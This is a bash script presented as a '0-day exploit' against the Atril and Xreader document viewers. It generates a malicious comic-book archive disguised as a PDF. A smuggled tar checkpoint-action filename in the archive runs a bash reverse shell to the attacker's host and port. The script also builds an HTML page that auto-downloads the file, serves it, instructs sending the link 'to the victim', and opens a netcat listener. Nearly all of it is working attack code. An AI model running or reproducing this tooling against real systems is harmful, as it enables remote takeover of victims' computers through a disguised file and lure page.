#! /bin/bash

# Requires pdftoppm from poppler-utils
banner(){
echo "
╔╦╗┌─┐┌─┐╔╦╗┌─┐┬─┐
 ║║│ ││   ║ ├─┤├┬┘
═╩╝└─┘└─┘ ╩ ┴ ┴┴└─
╔═╗┌┬┐┬─┐┬┬   ╦┌┐┌ ┬┌─┐┌─┐┌┬┐
╠═╣ │ ├┬┘││───║│││ │├┤ │   │ 
╩ ╩ ┴ ┴└─┴┴─┘ ╩┘└┘└┘└─┘└─┘ ┴ 
0-day Exploit
                                  -by Febin (@febin0x1)
                                  
[ Affected OS: Kali, Parrot OS, Linux Mint, Ubuntu-Mate, Xubuntu, Ubuntu-Kylin, Kylin OS, Fedora-Mate, Fedora-Cinnamon, Manjaro Mate, Manjaro Cinnamon ]
[ Affected Software: Atril Document viewer, Xreader ]

"

}


mainProgram(){
printf " [>] LHOST: "
read IP

printf " [>] LPORT: "
read LPORT

printf "[>] Location to the PDF to spoof [Default: sample.pdf]: "
read pdf_path
pdf_path=${pdf_path:-./sample.pdf}

export PAYLOAD="0<\&34-;exec 34<>/dev/tcp/${IP}/${LPORT};bash -i <\&34 >\&34 2>\&34"



echo "/Creator (Adobe Acrobat)" > emptyfile

tar -cf poc.cbt --transform="s|emptyfile|%PDF-1.4
%âã
1 0 obj
<<
/Title (TEST PDF file)
/Creator (Adobe Acrobat)
/Producer (Qt 5.15.8)
/CreationDate (D:20230812194726)
>>
endobj
|" emptyfile

mkdir Pages 2>/dev/null

pdftoppm ${pdf_path} Pages/Page -jpeg
tar -uf poc.cbt Pages/*.jpg

cp Pages/Page-1.jpg feb.jpg

tar -P -uf poc.cbt --transform="s|feb.jpg|  --checkpoint-action=exec=bash -c '$PAYLOAD';.jpg|" feb.jpg



rm -rf emptyfile

mkdir output/ 2>/dev/null

mv poc.cbt output/poc.cbt


rm -rf feb.jpg

rm -rf Pages/

echo "[+] Malicious Comic document is generated: $(realpath output/poc.cbt)"

printf " Do you want to start the listener here? [Y/n]: "
read choice

b64data="$(cat output/poc.cbt | base64 -w0)"
echo "
<body>
<h1>HELLO</h1>
</body>
<script>
filename = \"poc.cbt\"
filedata = \"$b64data\"

function base64tobytes(base64data){
    var binaryValues = atob(base64data);
    var binaryLength = binaryValues.length
    var bytesData = new Uint8Array(binaryLength);

    for ( var i = 0; i < binaryLength; i++){
        bytesData[i] = binaryValues.charCodeAt(i);
    }

    return bytesData.buffer;
}


var fileBytes = base64tobytes(filedata); 
var blob = new Blob([fileBytes], {\"type\":\"octet/stream\"});

var anchor = document.createElement(\"a\");
document.body.append(anchor);
anchor.style = \"display: None;\"

var url = window.URL.createObjectURL(blob);
anchor.href = url;
anchor.download = filename;

anchor.click();
window.URL.revokeObjectURL(url);
</script>
" > output/index.html
python3 -m http.server 8888 -d output/ >/dev/null 2>&1 &

echo "[+] Web server started on port 8888.."
echo "[+] Send the link http://[your-ip-address]:8888/index.html to the victim."
echo " " 
trap "killall python3; exit" INT
if [[ ${choice} == "Y" || ${choice} == "y" ]]
then
trap "killall python3; exit" INT
nc -nlvp "$LPORT"
else
echo "[+] Exiting.."
killall python3
exit
fi

}

if [ $(which pdftoppm) ]
then
banner
mainProgram
else
echo "[-] pdftoppm not found! Please install poppler-utils to run this exploit."
exit
fi



